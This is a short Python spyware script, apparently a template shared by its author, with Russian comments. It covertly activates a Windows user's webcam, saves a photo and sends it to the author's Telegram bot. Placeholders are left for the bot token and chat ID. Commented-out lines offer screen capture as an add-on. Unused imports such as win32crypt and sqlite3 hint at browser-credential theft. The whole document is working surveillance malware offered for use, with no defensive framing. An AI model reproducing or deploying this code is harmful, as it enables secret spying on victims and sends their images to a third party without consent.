##################################
#    CODED                       #
#       BY                       #
#          Alexmardev            #
#                                #
##################################



import os
import sqlite3
import win32crypt
import telebot
import shutil
import requests
import zipfile
import zipfile
from PIL import ImageGrab
import numpy as np
import cv2


"""Телеграм бот"""
username = os.getlogin()
token = 'API вашего телеграм бота,в ковычках'
bot = telebot.TeleBot(token)
# Включаем первую камеру
cap = cv2.VideoCapture(0)
  
# "Прогреваем" камеру, чтобы снимок не был тёмным
for i in range(30):
    cap.read()
  
# Делаем снимок
ret, frame = cap.read()
  
# Записываем в файл
photo = cv2.imwrite('cam.png', frame)
photo = open("cam.png", "rb")
bot.send_document("Ваш телеграм Id без ковычек", photo)
# Отключаем камеру
cap.release()
"""по желанию можно дописать код на скриншоты"""
#screen = ImageGrab.grab()
#shot = screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')#данные
#shot = open("sreenshot.jpg", "rb")


input()












